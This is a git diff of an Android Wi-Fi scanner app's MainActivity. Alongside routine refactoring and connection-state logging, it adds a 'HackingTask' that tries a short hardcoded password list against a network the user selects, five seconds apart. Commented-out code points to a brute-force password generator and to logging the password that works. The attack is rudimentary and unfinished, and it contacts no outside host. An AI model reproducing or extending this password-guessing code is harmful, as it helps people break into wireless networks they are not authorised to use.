@@ -7,16 +7,21 @@ import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.location.LocationManager;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
 import android.net.wifi.ScanResult;
+import android.net.wifi.SupplicantState;
 import android.net.wifi.WifiConfiguration;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
+import android.os.AsyncTask;
 import android.os.Bundle;
 import android.os.Handler;
 import android.support.constraint.ConstraintLayout;
 import android.support.v4.widget.SwipeRefreshLayout;
 import android.support.v7.app.AlertDialog;
 import android.support.v7.app.AppCompatActivity;
+import android.util.Log;
 import android.view.Menu;
 import android.view.MenuItem;
 import android.view.View;
@@ -85,18 +90,16 @@ public class MainActivity extends AppCompatActivity {
 
         updateListNetworks();
         myPullToRefresh();
-
     }
 
     private void updateListNetworks() {
-
-
-
+        Utils.checkWifiConnect(this, this);
+        Utils.displayLocationSettingsRequest(this, this);
 
         LocationManager manager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
-        boolean statusOfGPS = manager.isProviderEnabled(LocationManager.GPS_PROVIDER);
+        boolean statusGPS = manager.isProviderEnabled(LocationManager.GPS_PROVIDER);
         //TODO startScan() run right after turn on gps or wifi
-        if (wifi.getWifiState() == WifiManager.WIFI_STATE_ENABLED && statusOfGPS) {
+        if (wifi.getWifiState() == WifiManager.WIFI_STATE_ENABLED && statusGPS) {
             wifi.startScan();
 
 //            updateCurrentWifi(scanResults);
@@ -144,12 +147,12 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
-    public void updateCurrentWifi( List<ScanResult> scanResults) {
-        Utils utils = new Utils();
-        utils.checkWifiConnect(this, this);
-        utils.displayLocationSettingsRequest(this, this);
-        boolean isConnectAP = utils.isConnectAccessPoint(this);
-        String ip = utils.getWifiIpAddress(this);
+    public void updateCurrentWifi(List<ScanResult> scanResults) {
+//        Utils utils = new Utils();
+        Utils.checkWifiConnect(this, this);
+        Utils.displayLocationSettingsRequest(this, this);
+        boolean isConnectAP = Utils.isConnectAccessPoint(this);
+        String ip = Utils.getWifiIpAddress(this);
 
         if (isConnectAP) {
             constraint.setVisibility(View.VISIBLE); //show view of current connected wifi info
@@ -161,7 +164,6 @@ public class MainActivity extends AppCompatActivity {
             wifiCurrentDetail.setRSSI(wifiInfo.getRssi());
             wifiCurrentDetail.setSignalLevel(wifiInfo.getRssi());
             wifiCurrentDetail.setIP(ip);
-
 
 
             wifiCurrentDetail.setSignalIcon();
@@ -178,22 +180,22 @@ public class MainActivity extends AppCompatActivity {
                                 capabilities.contains("WEP"))) {
                             wifiCurrentDetail.setCapabilities(capabilities);
                             txtSecurity.setText(wifiCurrentDetail.getCapabilities());
-                            txtSecurity.setCompoundDrawablesWithIntrinsicBounds(R.drawable.ic_lock_grey_500_18dp,0,0,0);
+                            txtSecurity.setCompoundDrawablesWithIntrinsicBounds(R.drawable.ic_lock_grey_500_18dp, 0, 0, 0);
                         } else {
                             wifiCurrentDetail.setCapabilities("Open");
                             txtSecurity.setText(wifiCurrentDetail.getCapabilities());
-                            txtSecurity.setCompoundDrawablesWithIntrinsicBounds(R.drawable.ic_lock_open_grey_500_18dp,0,0,0);
+                            txtSecurity.setCompoundDrawablesWithIntrinsicBounds(R.drawable.ic_lock_open_grey_500_18dp, 0, 0, 0);
                         }
                     }
                 }
             }
 
-            txtNameDetail.setText(wifiCurrentDetail.getName() + "\n"+ "(" + wifiCurrentDetail.getBSSID() + ")");
+            txtNameDetail.setText(wifiCurrentDetail.getName() + "\n" + "(" + wifiCurrentDetail.getBSSID() + ")");
             txtIP.setText(wifiCurrentDetail.getIP());
-            txtSignalDetail.setText(""+wifiCurrentDetail.getRSSI());
+            txtSignalDetail.setText("" + wifiCurrentDetail.getRSSI());
             imgSignalDetail.setImageResource(wifiCurrentDetail.getSignalIcon());
 
-        }else
+        } else
             constraint.setVisibility(View.GONE); //remove/hide view of current connected wifi info
 
 
@@ -248,7 +250,9 @@ public class MainActivity extends AppCompatActivity {
                     case DialogInterface.BUTTON_POSITIVE:
                         //Yes button clicked
                         Toast.makeText(getApplicationContext(), "yes ", Toast.LENGTH_LONG).show();
-                        connectToWifi(adapter.getItem(position).getName());
+//                        connectToWifi(adapter.getItem(position).getName());
+                        doStart(adapter.getItem(position).getName());
+                        Log.d("pz","ssid: "+adapter.getItem(position).getName());
                         break;
 
                     case DialogInterface.BUTTON_NEGATIVE:
@@ -281,11 +285,40 @@ public class MainActivity extends AppCompatActivity {
         super.onResume();
     }
 
-    private class WifiScanReceiver extends BroadcastReceiver {
+    public class WifiScanReceiver extends BroadcastReceiver {
         public void onReceive(Context c, Intent intent) {
             List<ScanResult> results = wifi.getScanResults();
             updateCurrentWifi(results);
             scanWifi(results);
+
+            System.out.println("MYYYYRECEIVEDDDDDDDDDDDD");
+            System.out.println(WifiManager.NETWORK_STATE_CHANGED_ACTION + "/" +WifiManager.EXTRA_NETWORK_INFO);
+
+
+            NetworkInfo info = intent.getParcelableExtra(WifiManager.EXTRA_NETWORK_INFO);
+            if(info != null && info.isConnected()) {
+                // Do your work.
+                System.out.println("CONNECTEDDDDDDDDDDDDDDDDDDD");
+                // e.g. To check the Network Name or other info:
+
+            }
+            System.out.println(intent.getAction()+"////");
+            if(intent.getAction().equals(WifiManager.NETWORK_STATE_CHANGED_ACTION)) {
+                NetworkInfo networkInfo =
+                        intent.getParcelableExtra(WifiManager.EXTRA_NETWORK_INFO);
+                if(networkInfo.isConnected()) {
+                    // Wifi is connected
+                    Log.d("Inetify", "Wifi is connected: " + String.valueOf(networkInfo));
+                }
+            } else if(intent.getAction().equals(ConnectivityManager.CONNECTIVITY_ACTION)) {
+                NetworkInfo networkInfo =
+                        intent.getParcelableExtra(ConnectivityManager.EXTRA_NETWORK_INFO);
+                if(networkInfo.getType() == ConnectivityManager.TYPE_WIFI &&
+                        ! networkInfo.isConnected()) {
+                    // Wifi is disconnected
+                    Log.d("Inetify", "Wifi is disconnected: " + String.valueOf(networkInfo));
+                }
+            }
         }
     }
 
@@ -310,9 +343,8 @@ public class MainActivity extends AppCompatActivity {
     }
 
 
-
-
     private void finallyConnect(String networkPass, String networkSSID) {
+
         WifiConfiguration wifiConfig = new WifiConfiguration();
         wifiConfig.SSID = String.format("\"%s\"", networkSSID);
         wifiConfig.preSharedKey = String.format("\"%s\"", networkPass);
@@ -327,6 +359,7 @@ public class MainActivity extends AppCompatActivity {
         conf.SSID = "\"\"" + networkSSID + "\"\"";
         conf.preSharedKey = "\"" + networkPass + "\"";
         wifi.addNetwork(conf);
+
     }
 
     private void connectToWifi(final String wifiSSID) {
@@ -349,5 +382,45 @@ public class MainActivity extends AppCompatActivity {
             }
         });
         dialog.show();
+    }
+
+    void doStart(String ssid) {
+        HackingTask hackingTask = new HackingTask();
+        hackingTask.execute(ssid);
+
+    }
+    private class HackingTask extends AsyncTask<String, Integer, Integer> {
+
+        @Override
+        protected Integer doInBackground(String... strings) {
+            FindPassword bruteforce = new FindPassword();
+            String[] test = {"88888888","123456789","thecoffeehouse"};
+
+//            for (int length = bruteforce.min; length < bruteforce.max; length++) { // Change bruteforce.min and bruteforce.max for number of characters to bruteforce.
+            for (int i = 0; i < test.length; i++){
+                String testPass = test[i];
+                Log.d("pz", testPass);
+//                bruteforce.generate("", 0, length); //prepend_string, pos, length
+//                finallyConnect(bruteforce.pass,strings[0]);
+                finallyConnect(testPass,strings[0]);
+                try {
+                    Thread.sleep(5000);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
+
+//                if (finallyConnect(bruteforce.pass,strings[0])) {
+//                WifiInfo wifiInfo = wifi.getConnectionInfo();
+//                SupplicantState s = wifiInfo.getSupplicantState();
+//                String ss = SupplicantState.ASSOCIATED.toString();
+//                if (Utils.isConnectAccessPoint(getApplicationContext()) ){
+//                    Log.d("pz", Utils.convertSSID(wifiInfo.getSSID()) + "/" +strings[0]+ " /pass: "+testPass);
+//                    break;
+//                }
+
+            }
+
+            return null;
+        }
     }
 }
